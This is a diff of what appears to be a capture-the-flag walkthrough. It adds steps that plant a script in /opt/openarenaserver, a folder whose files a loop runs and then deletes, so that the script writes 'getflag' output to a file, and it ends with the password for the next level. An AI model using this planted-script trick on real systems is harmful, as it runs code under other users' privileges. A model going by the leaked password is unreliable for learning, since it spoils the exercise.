@@ -16,4 +16,10 @@ for i in /opt/openarenaserver/* ; do
         rm -f "$i"
 done
 
-5. 
+6. cd /opt/openarenaserver
+
+7. echo "getflag > /var/crash/flag" > flag.sh
+
+8. cat flag
+
+level06: viuaaale9huek52boumoomioc
